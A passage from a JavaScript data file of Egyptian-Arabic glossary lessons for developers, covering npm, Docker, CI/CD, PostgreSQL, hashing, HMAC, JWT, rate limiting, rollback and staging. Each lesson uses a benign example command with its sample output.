// تكملة تاب glossary: الأقسام دي بتتضاف للتاب اللي اتعرّف في js/tabs/glossary/01.js (شرح حقول الدرس في أوله)
MORE("glossary", [
    {
      t: "الكود والبيانات",
      l: 1,
      items: [
        {
          cmd: "package manager",
          title: "مدير الباكدجات",
          desc: "برنامج بيسطّب ويحدّث برامج ومكتبات من مستودع: apt للنظام، npm لـ Node، brew للماك، pip لـ Python.",
          teach: R`## الفكرة

بدل ما تدوّر على موقع البرنامج وتنزّله وتسطّبه بإيدك، بتقول للـ package manager الاسم، وهو يجيبه من مستودع (registry) ويسطّبه ويسطّب اللي محتاجه، ويحدّثه بعدين.

| الأداة | بتسطّب إيه |
|---|---|
| [[apt]] | برامج النظام على أوبونتو و Debian |
| [[brew]] | برامج على الماك |
| [[winget]] | برامج على ويندوز |
| [[npm]] / [[pnpm]] | مكتبات JavaScript لمشروع |
| [[pip]] | مكتبات Python |

## المثال: [[npm -v; apt --version | head -1]]

- [[-v]] و [[--version]] بيطبعوا النسخة: أسهل طريقة تتأكد إن الأداة موجودة.
- [[;]] بيفصل أمرين، و [[head -1]] أول سطر بس.

~~~text npm -v (ويندوز، Node 24)
11.17.0
~~~

~~~text apt --version | head -1 (ubuntu:24.04)
apt 2.8.3 (amd64)
~~~

[[apt]] مش موجود على ويندوز ولا الماك، وده طبيعي.

> الخلاصة: فيه مدير للنظام ومدير لكل لغة، ومتخلطش بينهم.`,
          example: "npm -v; apt --version | head -1",
          try: "Node المستوى ١"
        },
        {
          cmd: "dependency",
          title: "اعتمادية",
          desc: "مكتبة كودك محتاجها. dependencies للتشغيل، devDependencies للتطوير بس. والمكتبات ليها مكتبات (transitive).",
          teach: R`## الفكرة

كل مكتبة مشروعك بيستخدمها مكتوبة في [[package.json]]:

| المكان | مثال | بتتسطّب على السيرفر؟ |
|---|---|---|
| [[dependencies]] | express | أيوه، التطبيق محتاجها وهو شغال |
| [[devDependencies]] | eslint، typescript | لأ، للتطوير والبناء بس |

والمكتبة نفسها ليها مكتبات، ودول اسمهم transitive dependencies.

## المثال: [[npm ls --depth=0]]

[[npm ls]] بيعرض شجرة المكتبات المتسطّبة، و [[--depth=0]] أول مستوى بس (اللي انت طلبتهم):

~~~text الناتج في مشروع تجربة (ويندوز)
proj@1.0.0 C:\Users\ali\proj
+-- @eslint/js@10.0.1
+-- eslint@10.12.0
+-- express@5.2.1
+-- prettier@3.9.9
$__bt-- typescript@7.0.2
~~~

٥ مكتبات طلبناهم، بس من غير [[--depth=0]] الشجرة طلعت ٢٥٥ سطر: ده حجم الـ transitive.

> الخلاصة: كل مكتبة بتضيفها بتجيب معاها شجرة، فضيف اللي محتاجه بس.`,
          example: "npm ls --depth=0",
          try: "Node المستوى ١: [[npm install]]"
        },
        {
          cmd: "semver",
          title: "ترقيم النسخ",
          desc: "major.minor.patch: الأول تغيير كاسر، التاني ميزة، التالت إصلاح. [[^]] بيسمح بـ minor و patch (لو النسخة 0.x بـ patch بس)، [[~]] بـ patch بس.",
          teach: R`## الـ ٣ أرقام

~~~text
5  .  2  .  1
│     │     └── patch: إصلاح غلطة، مفيش حاجة جديدة
│     └──────── minor: ميزة جديدة، والقديم شغال زي ما هو
└────────────── major: تغيير كاسر، كودك ممكن يحتاج تعديل
~~~

## الرموز في package.json

| المكتوب | بيقبل |
|---|---|
| [[5.2.1]] | النسخة دي بالظبط |
| [[~5.2.1]] | [[5.2.x]]: patch بس |
| [[^5.2.1]] | [[5.x.x]]: minor و patch |
| [[^0.2.1]] | [[0.2.x]] بس، لأن قبل 1.0 الـ minor نفسه ممكن يكسر |

## المثال: [[npm view express version]]

[[npm view]] بيسأل الـ registry عن باكدج من غير ما يسطّبها، و [[version]] آخر نسخة:

~~~text الناتج (ويندوز)
5.2.1
~~~

ولما سطّبناها، [[package.json]] اتكتب فيه [[^5.2.1]]، يعني أي 5.x أحدث تنفع، بس 6 لأ.

> الخلاصة: الرقم الأول اتغيّر؟ اقرا الـ changelog قبل ما تحدّث.`,
          example: "npm view express version",
          try: "Node المستوى ١: [[^ و ~ في النسخ]]"
        },
        {
          cmd: "lock file",
          title: "ملف التثبيت",
          desc: "package-lock.json: النسخ اللي اتسطّبت بالظبط. بيضمن نفس node_modules على كل جهاز. [[npm ci]] بيقرا منه بس.",
          teach: R`## ليه موجود

[[package.json]] بيقول [[^5.2.1]]، يعني «أي 5.x». فلو زميلك سطّب بعد شهر ممكن ياخد 5.3.0 وانت عندك 5.2.1. الـ lock file بيكتب النسخة اللي اتسطّبت فعلًا لكل مكتبة في الشجرة، فالكل ياخد نفس الحاجة بالظبط.

## المثال: [[head -20 package-lock.json]]

[[head -20]] أول ٢٠ سطر:

~~~text الناتج في مشروع تجربة (مقصوص)
{
  "name": "proj",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "proj",
      ...
      "dependencies": {
        "express": "^5.2.1"
      }
    },
    "node_modules/accepts": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/accepts/-/accepts-2.0.0.tgz",
      "integrity": "sha512-5cvg6CtKwfgdmVqY1WIiXKc3Q1bkRqGLi+2W/...",
~~~

- [[""]] هو مشروعك نفسه، بالـ [[^]] زي package.json.
- [[node_modules/accepts]] مكتبة transitive (express محتاجها): نسختها بالظبط، ومنين اتنزلت ([[resolved]])، و [[integrity]] hash للملف عشان لو اتغيّر التسطيب يفشل.

> الخلاصة: الـ lock file يتعمله commit دايمًا، و [[npm ci]] على السيرفر و CI بيسطّب منه بالظبط.`,
          example: "head -20 package-lock.json",
          try: "Node المستوى ١: [[package-lock و npm ci]]"
        },
        {
          cmd: "image / container",
          title: "القالب والنسخة الشغالة",
          desc: "الـ image ملف ثابت فيه التطبيق وبيئته. الـ container نسخة شغالة منه. من image واحدة كذا container. الـ container بيتمسح والـ image بتفضل.",
          teach: R`## الفرق

| | image | container |
|---|---|---|
| هي إيه | قالب ثابت: النظام والتطبيق ومكتباته | نسخة شغالة من القالب |
| بتتغيّر؟ | لأ، للقراية بس | أيوه، ليها طبقة كتابة خاصة بيها |
| لما تمسحها | لازم تبنيها أو تسحبها تاني | أي حاجة اتكتبت جواها راحت |

زي الـ class والـ object: image واحدة يطلع منها كذا container.

## المثال: [[docker images | head -3; docker ps]]

- [[docker images]] الـ images اللي على جهازك، و [[head -3]] أول سطرين بعد العناوين.
- [[docker ps]] الـ containers الشغالة دلوقتي بس ([[-a]] يضيف الواقفة).

~~~text docker ps بعد ما شغّلنا nginx:alpine (Docker 29 على ويندوز)
CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS                  PORTS     NAMES
8002ac62b8d6   nginx:alpine   "/docker-entrypoint.…"   1 second ago   Up Less than a second   80/tcp    g01-web
~~~

عمود [[IMAGE]] بيقولك الـ container ده طالع من أنهي image. وفي Docker 29 جدول [[docker images]] بقت عناوينه [[IMAGE  ID  DISK USAGE  CONTENT SIZE  EXTRA]].

> الخلاصة: البيانات المهمة متتحطش جوه الـ container، لأنه معمول عشان يتمسح ويتعمل من جديد.`,
          example: "docker images | head -3; docker ps",
          try: "Docker المستوى ١"
        },
        {
          cmd: "volume",
          title: "تخزين دائم",
          desc: "مساحة بره الـ container بتفضل لما يتمسح. قاعدة البيانات لازم volume. الـ bind mount فولدر من جهازك.",
          teach: R`## الفكرة

الـ container لما يتمسح كل اللي اتكتب جواه بيروح. الـ volume مساحة Docker بيديرها **بره** الـ container وبتتركّب جواه على مسار، فتفضل بعد ما الـ container يتمسح، والـ container الجديد يلاقيها.

| النوع | فين | امتى |
|---|---|---|
| volume | Docker بيختار المكان | بيانات القاعدة والرفع |
| bind mount | فولدر انت بتحدده من جهازك | الكود وقت التطوير |

## المثال: [[docker volume ls]]

بيعرض الـ volumes. عملنا واحد اسمه [[g01-data]] وبصينا:

~~~text الناتج (Docker على ويندوز، متفلتر على الاسم)
DRIVER    VOLUME NAME
local     g01-data
~~~

[[local]] يعني متخزن على نفس الجهاز. وفي compose: [[- pgdata:/var/lib/postgresql/data]].

> الخلاصة: قاعدة بيانات في container من غير volume = هتضيع أول ما تمسحه.`,
          example: "docker volume ls",
          try: "Docker المستوى ٢: [[volumes]]"
        },
        {
          cmd: "registry",
          title: "مخزن الصور",
          desc: "سيرفر بيخزّن Docker images: Docker Hub، ghcr.io. بتبني وترفع (push)، والسيرفر ينزّل (pull).",
          teach: R`## الفكرة

مكان على النت بتتخزن فيه الـ images بأسامي وأرقام نسخ (tags): Docker Hub هو الافتراضي، و [[ghcr.io]] بتاع GitHub. الدورة:

~~~text
جهازك: docker build  →  docker push  →  registry  →  docker pull  :السيرفر
~~~

## المثال: [[docker pull hello-world]]

[[pull]] بينزّل الـ image. ومن غير اسم registry يبقى Docker Hub، ومن غير tag يبقى [[latest]]:

~~~text الناتج (آخر ٤ سطور، Docker على ويندوز)
4f55086f7dd0: Pull complete
Digest: sha256:5e23090353324d887c48ad5e5c56d294eab81588df9605b07d1afe895f9cc8f8
Status: Downloaded newer image for hello-world:latest
docker.io/library/hello-world:latest
~~~

- [[Pull complete]] لكل طبقة.
- [[Digest]] الـ hash بتاع الـ image بالظبط، ومبيتغيّرش زي الـ tag.
- آخر سطر الاسم الكامل: [[docker.io]] (Docker Hub) و [[library]] (الصور الرسمية) و [[:latest]].

> الخلاصة: الـ image اللي على السيرفر جاية من registry، فالـ tag اللي بترفعه هو اللي بيتنشر.`,
          example: "docker pull hello-world",
          try: "Docker المستوى ٢: [[build / tag / push]]"
        },
        {
          cmd: "CI / CD",
          title: "التكامل والتسليم المستمر",
          desc: "CI: الاختبارات بتشتغل أوتوماتيك مع كل push. CD: الـ deploy بيحصل أوتوماتيك لما تنجح. GitHub Actions بيعمل الاتنين.",
          teach: R`## الفرق

| | بيعمل إيه | امتى |
|---|---|---|
| CI (Continuous Integration) | يشغّل الفحص والاختبارات | مع كل push أو PR |
| CD (Continuous Delivery/Deployment) | يرفع النسخة للسيرفر | لما الـ CI ينجح |

الفكرة إن مفيش حاجة توصل الـ main أو السيرفر إلا لما الفحص يعدّي، بدل «على جهازي شغال».

## المثال: [[gh run list --limit 3]]

[[gh]] أداة GitHub في الترمنال، و [[run list]] آخر تشغيلات الـ workflows، و [[--limit 3]] تلاتة بس. جرّبناه على ريبو الموقع ده:

~~~text الناتج (أول سطرين، الأعمدة مفصولة بـ tab)
completed  success  Rebuild dist                check                   main  push     37624238363  21s    2026-10-07T12:53:01Z
completed  success  pages build and deployment  pages-build-deployment  main  dynamic  37624236862  2m49s  2026-10-07T12:53:01Z
~~~

الأعمدة: الحالة، والنتيجة ([[success]] أو [[failure]])، ورسالة الـ commit، واسم الـ workflow، والـ branch، والحدث ([[push]])، ورقم التشغيل، والمدة، والوقت.

> الخلاصة: CI بيقول «الكود سليم»، و CD بيقول «وطلع على السيرفر».`,
          example: "gh run list --limit 3",
          try: "GitHub Actions"
        },
        {
          cmd: "pipeline",
          title: "خط الإنتاج",
          desc: "سلسلة خطوات أوتوماتيك: lint، test، build، deploy. كل خطوة لازم تنجح عشان اللي بعدها تبدأ. في bash: الـ pipe بيوصّل أوامر.",
          teach: R`## الفكرة

سلسلة خطوات بتمشي بالترتيب، وأي خطوة تفشل الباقي يقف:

~~~text
lint  →  test  →  build  →  deploy
~~~

في GitHub Actions الـ pipeline ملف YAML في [[.github/workflows/]] اسمه workflow، فيه jobs، وكل job فيه steps.

## المثال: [[gh workflow list]]

بيعرض الـ workflows المعرّفة في الريبو. على ريبو الموقع ده:

~~~text الناتج
check                   active  370269859
pages-build-deployment  active  367282493
~~~

الاسم، والحالة ([[active]] أو [[disabled]])، ورقمه. [[check]] ده الـ pipeline بتاعنا اللي بيشغّل الفحص ويتأكد إن [[dist]] متحدّث.

وفي bash نفس الكلمة لمعنى قريب: [[a | b | c]] ناتج كل أمر داخل للي بعده.

> الخلاصة: pipeline = خطوات بالترتيب، والفشل في أي خطوة بيوقف اللي بعدها.`,
          example: "gh workflow list",
          try: "GitHub Actions المستوى ٢"
        },
        {
          cmd: "artifact",
          title: "ناتج",
          desc: "ملف طالع من خطوة build: فولدر dist، أو Docker image، أو تقرير. بيتحفظ عشان خطوة تانية تستخدمه.",
          teach: R`## الفكرة

الحاجة اللي طالعة من الـ build ومحتاجها بعدين: فولدر [[dist]]، أو ملف [[.apk]]، أو Docker image، أو تقرير اختبارات. في CI كل job شغال على جهاز جديد فاضي، فلو job الـ deploy محتاج ناتج job الـ build، الأول يرفعه كـ artifact والتاني ينزّله.

## المثال: [[ls dist/ 2>/dev/null | head]]

- [[ls dist/]] اعرض اللي في فولدر الـ build.
- [[2>/dev/null]] لو الفولدر مش موجود، متطبعش error.
- [[head]] أول ١٠ بس.

لو مفيش [[dist]] خالص الأمر مبيطبعش حاجة، وده معناه إنك لسه معملتش build. وفي GitHub Actions الرفع بـ [[actions/upload-artifact]] والتنزيل بـ [[actions/download-artifact]] (من الـ docs).

> الخلاصة: artifact = ناتج build محفوظ عشان خطوة تانية أو انت تستخدمه.`,
          example: "ls dist/ 2>/dev/null | head",
          try: "GitHub Actions المستوى ٢: [[cache و artifacts]]"
        },
        {
          cmd: "migration",
          title: "تغيير الـ schema بترتيب",
          desc: "ملف SQL مرقّم بيغيّر هيكل القاعدة (جدول جديد، عمود). بتتطبق بالترتيب وبتتسجّل، فكل بيئة توصل لنفس الهيكل.",
          teach: R`## الفكرة

بدل ما تعدّل الجداول بإيدك على كل جهاز، كل تغيير في الـ schema بيبقى ملف SQL برقم أو تاريخ:

~~~text
migrations/
  20260101_create_users/migration.sql
  20260115_add_phone_to_users/migration.sql
~~~

الأداة بتحفظ جدول جوه القاعدة فيه الملفات اللي اتطبقت، وتطبّق الجديد بس بالترتيب. فجهازك و staging والإنتاج يوصلوا لنفس الهيكل.

## المثال: [[npx prisma migrate status]]

- [[npx]] بيشغّل أداة من [[node_modules]] (أو ينزّلها).
- [[prisma migrate status]] بيقارن ملفات الـ migrations بالجدول اللي في القاعدة ويقولك لو فيه حاجة لسه متطبقتش.

ده محتاج مشروع Prisma وقاعدة شغالة، فمش متجرّب هنا. حسب الـ docs بيقول [[Database schema is up to date!]] أو يعدّ الـ migrations اللي ناقصة.

> الخلاصة: migration اتطبقت متتعدّلش، اعمل واحدة جديدة.`,
          example: "npx prisma migrate status",
          try: "PostgreSQL المستوى ٣: [[Prisma migrate]]"
        },
        {
          cmd: "ORM",
          title: "الوسيط مع القاعدة",
          desc: "مكتبة بتخليك تكتب [[prisma.user.findMany()]] بدل SQL. بتحمي من SQL injection، وبتدير الـ migrations. Prisma، TypeORM، Drizzle.",
          teach: R`## الفكرة

ORM = Object-Relational Mapping: الجداول بتبقى objects في لغتك، والمكتبة بتكتب الـ SQL:

~~~text
prisma.user.findMany({ where: { active: true } })
            ↓ بتبقى
SELECT * FROM "User" WHERE active = true;
~~~

ومن غير ما تفكّر، القيم بتتبعت parameters منفصلة عن الـ SQL، فالـ SQL injection مش بيحصل. وأغلبهم بيولّدوا migrations من تعريف الجداول.

## المثال: [[npx prisma --version]]

بيطبع نسخة Prisma ونسخ الأجزاء اللي معاه. محتاج مشروع فيه Prisma، فمش متجرّب هنا (من الـ docs).

| ORM | ملاحظة |
|---|---|
| Prisma | ملف [[schema.prisma]] وأنواع TypeScript جاهزة |
| Drizzle | الجداول مكتوبة TypeScript، وقريب من SQL |
| TypeORM | classes بـ decorators |

> الخلاصة: ORM بيوفر SQL كتير ويحمي من injection، بس الاستعلام البطيء لسه محتاج تفهم الـ SQL اللي طالع.`,
          example: "npx prisma --version",
          try: "الأمان المستوى ٢: [[2. SQL Injection]]"
        },
        {
          cmd: "index",
          title: "فهرس الجدول",
          desc: "هيكل جانبي بيخلي البحث في عمود لحظي بدل قراية الجدول كله. كل foreign key وكل عمود في WHERE متكرر محتاج واحد.",
          teach: R`## الفكرة

من غير index، [[WHERE email = 'x']] بيقرا الجدول كله صف صف. الـ index هيكل جانبي مترتب (زي فهرس الكتاب)، فالقاعدة تروح للصف على طول. التمن: مساحة، وكل [[INSERT]] بيحدّث الـ index كمان.

## المثال: [[psql -c "\di" 2>/dev/null | head]]

- [[psql -c]] شغّل أمر واحد واخرج.
- [[\di]] أمر جوه psql: «اعرض الـ indexes» (d = describe، i = index).

جرّبناه في [[postgres:16-alpine]] على جدول [[users]] فيه primary key و index على [[email]]:

~~~text الناتج
                  List of relations
 Schema |      Name       | Type  |  Owner   | Table
--------+-----------------+-------+----------+-------
 public | users_email_idx | index | postgres | users
 public | users_pkey      | index | postgres | users
(2 rows)
~~~

[[users_pkey]] اتعمل لوحده مع الـ primary key، والتاني احنا عملناه بـ [[CREATE INDEX users_email_idx ON users(email)]]. أما الـ foreign key فـ Postgres **مش** بيعمله index لوحده.

> الخلاصة: عمود بتدوّر بيه كتير أو foreign key = محتاج index.`,
          example: R`psql -c "\di" 2>/dev/null | head`,
          try: "PostgreSQL المستوى ٢: [[الـ indexes]]"
        },
        {
          cmd: "connection pool",
          title: "مجمّع الاتصالات",
          desc: "بدل اتصال جديد لكل طلب (غالي)، عدد ثابت من الاتصالات المفتوحة بيتشاركوا. PgBouncer و Supabase pooler على 6543.",
          teach: R`## الفكرة

فتح اتصال بـ Postgres غالي: كل اتصال عملية جديدة على السيرفر وفيه مصافحة وتسجيل دخول. والقاعدة ليها حد أقصى ([[max_connections]]، افتراضيًا 100). فبدل اتصال لكل طلب، بتفتح عدد ثابت (مثلًا 10) والطلبات بتستلفهم وترجّعهم.

## المثال

~~~bash
psql -c "SELECT count(*) FROM pg_stat_activity;" 2>/dev/null
~~~

[[pg_stat_activity]] view فيه سطر لكل اتصال أو عملية شغالة على القاعدة، و [[count(*)]] بيعدّهم:

~~~text الناتج في postgres:16-alpine فاضي
 count
-------
     6
(1 row)
~~~

٦ مع إن مفيش غير اتصالنا: الباقيين عمليات Postgres الداخلية (زي autovacuum و checkpointer). ولو الرقم قرّب من [[max_connections]] يبقى محتاج pool أو فيه تسريب اتصالات.

> الخلاصة: التطبيق يكلّم الـ pool، والـ pool يكلّم القاعدة بعدد ثابت. في Supabase البورت 6543 هو الـ pooler.`,
          example: R`psql -c "SELECT count(*) FROM pg_stat_activity;" 2>/dev/null`,
          try: "PostgreSQL المستوى ٣: [[connection pooling]]"
        },
        {
          cmd: "transaction",
          title: "معاملة",
          desc: "مجموعة استعلامات إما تنجح كلها أو تترجع كلها. [[idle in transaction]] اتصال فتح واحدة ونسي يقفلها وماسك locks.",
          teach: R`## الفكرة

تحويل فلوس: خصم من حساب وإضافة لحساب. لو الأولى نجحت والتانية فشلت، الفلوس اختفت. الـ transaction بتخلي المجموعة كلها حاجة واحدة:

~~~text
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;      -- أو ROLLBACK لو حاجة غلط
~~~

## المثال

~~~bash
psql -c "SELECT state, count(*) FROM pg_stat_activity GROUP BY 1;" 2>/dev/null
~~~

- [[state]] حالة كل اتصال، و [[GROUP BY 1]] جمّع على أول عمود، و [[count(*)]] كام واحد في كل حالة.

~~~text الناتج في postgres:16-alpine
 state  | count
--------+-------
        |     5
 active |     1
(2 rows)
~~~

[[active]] هو استعلامنا نفسه، والفاضي عمليات Postgres الداخلية. على سيرفر حقيقي هتلاقي [[idle]] (اتصال مستني)، والخطر [[idle in transaction]]: حد عمل [[BEGIN]] ومقفلش، فماسك locks وغيره مستني.

> الخلاصة: كل [[BEGIN]] لازم يخلص بـ [[COMMIT]] أو [[ROLLBACK]]، بسرعة.`,
          example: R`psql -c "SELECT state, count(*) FROM pg_stat_activity GROUP BY 1;" 2>/dev/null`,
          try: "PostgreSQL المستوى ٢: [[الجلسات والأقفال]]"
        },
        {
          cmd: "hash",
          title: "بصمة",
          desc: "رقم ثابت الطول بيتحسب من أي بيانات: نفس المدخل نفس الرقم، وأي تغيير يغيّره كله. للباسوردات (bcrypt)، وسلامة الملفات (sha256)، و commits Git.",
          teach: R`## الفكرة

دالة بتاخد أي بيانات وتطلّع رقم بطول ثابت:
- نفس المدخل = نفس الناتج دايمًا.
- حرف واحد يتغيّر = ناتج مختلف تمامًا.
- مفيش طريقة ترجع من الناتج للمدخل.

## المثال: [[echo -n hello | sha256sum]]

- [[echo -n]] اطبع من غير سطر جديد في الآخر ([[-n]] = no newline).
- [[sha256sum]] احسب SHA-256.

~~~text الناتج في ubuntu:24.04
2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  -
~~~

٦٤ حرف hex = ٢٥٦ بت. و [[-]] يعني الدخل جه من stdin مش من ملف. وجرّبنا [[hellO]] (حرف واحد كبير) طلع [[04a6f55f...]]، ومن غير [[-n]] طلع [[5891b5b5...]]: سطر جديد واحد غيّر كل حاجة.

> الخلاصة: الـ hash بيثبت إن البيانات متغيّرتش. للباسوردات استخدم bcrypt أو argon2، مش SHA-256 لوحده لأنه سريع زيادة.`,
          example: "echo -n hello | sha256sum",
          try: "VPS المستوى ٣: [[sha256sum]]"
        },
        {
          cmd: "HMAC",
          title: "توقيع بمفتاح",
          desc: "hash محسوب بمفتاح سري. البوابة بتبعته مع الـ webhook، وانت بتحسبه بنفس المفتاح وتقارن. لو مطابق، الطلب منهم ومتغيرش.",
          teach: R`## الفكرة

hash عادي أي حد يقدر يحسبه، فالمهاجم يغيّر البيانات ويحسب hash جديد. HMAC = Hash-based Message Authentication Code: hash بيدخل فيه مفتاح سري، فاللي معاه المفتاح بس يقدر يطلّعه.

~~~text
البوابة: HMAC(body, secret)  →  بتبعته في header
انت:     HMAC(body, secret)  →  قارن. متطابقين؟ الطلب منهم ومتغيّرش
~~~

## المثال

~~~bash
echo -n data | openssl dgst -sha256 -hmac secret
~~~

- [[openssl dgst]] (digest) احسب hash، و [[-sha256]] بأنهي خوارزمية.
- [[-hmac secret]] استخدم المفتاح [[secret]].

~~~text الناتج في ubuntu:24.04 (OpenSSL 3.0.13)
SHA2-256(stdin)= 1b2c16b75bd2a870c114153ccda5bcfca63314bc722fa160d690de133ccbb9db
~~~

ونفس البيانات بمفتاح [[secret2]] طلّعت [[b2d0dd56...]]: من غير المفتاح الصح مستحيل تطلّع نفس التوقيع.

> الخلاصة: احسبه على الـ body الخام زي ما وصل، وقارن بـ [[timingSafeEqual]] مش [[===]].`,
          example: "echo -n data | openssl dgst -sha256 -hmac secret",
          try: "Node المستوى ٣: [[التحقق من التوقيع]]"
        },
        {
          cmd: "JWT / token",
          title: "تذكرة الدخول",
          desc: "نص بيثبت إنك داخل: بيتبعت مع كل طلب في Authorization header. JWT فيه بيانات مقروءة (مش مشفّرة) وتوقيع، وبينتهي في وقت.",
          teach: R`## شكل الـ JWT

٣ حتت base64url مفصولين بنقط: [[header.payload.signature]]. عملنا واحد في Node:

~~~text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsIm5hbWUiOiJBbGkiLCJleHAiOjE3NjAwMDAwMDB9.pf5XZjgFWkJUSAztsKKK5ygifdshY6TIRuSrpsijGBc
~~~

| الحتة | فيها |
|---|---|
| header | الخوارزمية: [[{"alg":"HS256","typ":"JWT"}]] |
| payload | البيانات: [[{"sub":"42","name":"Ali","exp":1760000000}]] |
| signature | HMAC على أول حتتين بمفتاح السيرفر |

## المثال

~~~bash
node -e "console.log(Buffer.from('eyJhbGciOiJIUzI1NiJ9','base64').toString())"
~~~

- [[node -e]] شغّل الكود ده على طول.
- [[Buffer.from(..., 'base64')]] فك الـ base64 لـ bytes، و [[.toString()]] حوّلها نص.

~~~text الناتج (Node 24)
{"alg":"HS256"}
~~~

أي حد يفك الـ payload بنفس الطريقة، فمتحطش فيه باسورد. الأمان في التوقيع: لو حد غيّر [[sub]] التوقيع مش هيطابق. و [[exp]] وقت الانتهاء بالثواني ([[1760000000]] = ٩ أكتوبر ٢٠٢٥).

> الخلاصة: JWT مقروء لأي حد ومش متشفّر، بس مستحيل يتعدّل من غير المفتاح.`,
          example: R`node -e "console.log(Buffer.from('eyJhbGciOiJIUzI1NiJ9','base64').toString())"`,
          try: "المتصفح: [[localStorage و JWT]]"
        },
        {
          cmd: "idempotency",
          title: "نفس النتيجة مهما تكرر",
          desc: "عملية لو اتنفذت مرتين بنفس المدخل نتيجتها زي مرة. لازمة للـ webhooks (بتتكرر) وسكربتات التجهيز ([[mkdir -p]]).",
          teach: R`## الفكرة

تشغّل العملية مرة أو عشرة، النتيجة واحدة. مهمة لأن الشبكة بتعيد: الـ webhook ممكن يوصل مرتين، والمستخدم ممكن يدوس «ادفع» مرتين.

| العملية | idempotent؟ |
|---|---|
| [[mkdir -p dir]] | أيوه |
| [[mkdir dir]] | لأ، التانية بتفشل |
| [[UPDATE ... SET paid = true]] | أيوه |
| [[UPDATE ... SET balance = balance + 100]] | لأ، كل مرة بتزود |

## المثال: [[mkdir -p /tmp/x && mkdir -p /tmp/x && echo ok]]

- [[-p]] (parents): اعمل الفولدرات اللي في السكة، ولو موجود متعملش حاجة ومتشتكيش.
- [[&&]] كمّل لو اللي قبلها نجح.

~~~text الناتج في ubuntu:24.04
ok
~~~

والمرتين نجحوا. ومن غير [[-p]] المرة التانية:

~~~text
mkdir: cannot create directory '/tmp/x': File exists
~~~

> الخلاصة: في الـ webhooks احفظ رقم الحدث، ولو جه تاني رد 200 من غير ما تنفّذ.`,
          example: "mkdir -p /tmp/x && mkdir -p /tmp/x && echo ok",
          try: "Node المستوى ٣: [[إعادة الإرسال والتكرار]]"
        },
        {
          cmd: "rate limiting",
          title: "حد الطلبات",
          desc: "أقصى عدد طلبات من IP أو يوزر في فترة. بيمنع brute force والإغراق. 429 هو الرد الصح لما يتعدّى، و Nginx افتراضيًا بيرد 503 إلا لو كتبت [[limit_req_status 429]].",
          teach: R`## الفكرة

حد أقصى لعدد الطلبات من نفس المصدر (IP أو يوزر أو API key) في وقت معيّن، زي ٥ محاولات دخول في الدقيقة. اللي بيعدّي الحد بياخد رد رفض بدل ما يوصل للتطبيق.

## المثال

~~~bash
grep limit_req /etc/nginx/nginx.conf /etc/nginx/sites-enabled/* 2>/dev/null | head -3
~~~

بيدوّر على إعدادات الـ rate limit في Nginx. جرّبنا إعداد بالشكل ده في [[nginx:alpine]]:

~~~text الناتج
/etc/nginx/conf.d/default.conf:limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
~~~

- [[limit_req_zone]] بيعرّف العداد: [[$binary_remote_addr]] يعني عداد لكل IP، و [[zone=login:10m]] اسمه ومساحة ١٠ ميجا، و [[rate=1r/s]] طلب في الثانية.
- [[limit_req zone=login;]] جوه [[location]] بيطبّقه.

وبعتنا ٣ طلبات ورا بعض:

~~~text
HTTP/1.1 200 OK
HTTP/1.1 503 Service Temporarily Unavailable
HTTP/1.1 503 Service Temporarily Unavailable
~~~

Nginx افتراضيًا بيرد **503** مش 429. ولما ضفنا [[limit_req_status 429;]] بقى [[429 Too Many Requests]]، وده الصح عشان العميل يفهم إنه يستنى.

> الخلاصة: rate limit على الدخول والـ API، و [[limit_req_status 429]] في Nginx.`,
          example: "grep limit_req /etc/nginx/nginx.conf /etc/nginx/sites-enabled/* 2>/dev/null | head -3",
          try: "Nginx المستوى ٢: [[rate limiting]]"
        },
        {
          cmd: "rollback",
          title: "الرجوع",
          desc: "ترجّع النسخة اللي قبل الـ deploy لما الجديد يكسر. مع images بأرقام: تغيير tag و up. لازم يبقى مجرّب قبل ما تحتاجه.",
          teach: R`## الفكرة

الـ deploy الجديد كسر حاجة؟ ترجع للنسخة اللي قبله في أسرع وقت، وبعدين تصلّح على مهلك. ده بيبقى سهل لو كل نسخة ليها اسم ثابت:

| الطريقة | الرجوع |
|---|---|
| Docker image بـ tag لكل نسخة ([[myapp:42]]) | غيّر الـ tag لـ [[41]] و [[docker compose up -d]] |
| Git على السيرفر | [[git checkout]] الـ commit اللي قبل وأعد البناء |

## المثال: [[git log --oneline -3]]

- [[--oneline]] كل commit في سطر: أول حروف الـ hash والرسالة.
- [[-3]] آخر ٣ بس.

~~~text الناتج على ريبو الموقع ده
e07295d Rebuild dist
7ad1813 Step-by-step explanations for 60 symbol lessons (shell, operators, brackets, TypeScript); %VAR% example uses OS boxes
08d39aa Rebuild dist
~~~

من هنا تعرف «النسخة اللي كانت شغالة» تبقى أنهي hash. والـ migrations اللي غيّرت القاعدة مش بترجع لوحدها، فخليها متوافقة مع النسخة القديمة.

> الخلاصة: جرّب الرجوع قبل ما تحتاجه، مش وقت ما الموقع واقع.`,
          example: "git log --oneline -3",
          try: "التشخيص: [[الـ deploy كسر الموقع]]"
        },
        {
          cmd: "staging",
          title: "بيئة التجربة",
          desc: "نسخة من الإنتاج للاختبار قبل الرفع: نفس الإعدادات ببيانات تجريبية ودومين تاني محمي بباسورد.",
          teach: R`## الفكرة

| البيئة | مين بيستخدمها |
|---|---|
| local | انت على جهازك |
| staging | انت والفريق، تجربة أخيرة |
| production | الزوار الحقيقيين |

staging نسخة من الإنتاج بنفس الإعدادات والإصدارات، بس بقاعدة تجريبية ودومين تاني. أي deploy يعدّي عليها الأول. ولازم تبقى مقفولة (باسورد) عشان جوجل ميأرشفهاش والناس متدخلهاش.

## المثال: [[curl -sI https://staging.example.com | head -1]]

نفس فحص سطر الحالة. [[staging.example.com]] مش موجود فعلًا، فالأمر مطبعش حاجة. جرّبنا نفس الفكرة على صفحة محمية بـ basic auth على [[httpbin.org]]:

~~~text الناتج (Git Bash على ويندوز)
HTTP/1.1 401 UNAUTHORIZED
~~~

[[401]] هو اللي عايز تشوفه من غير باسورد: يعني الحماية شغالة. لو طلع [[200]] يبقى staging مفتوحة للكل.

> الخلاصة: staging شبه الإنتاج بالظبط، ومقفولة عن الناس.`,
          example: "curl -sI https://staging.example.com | head -1",
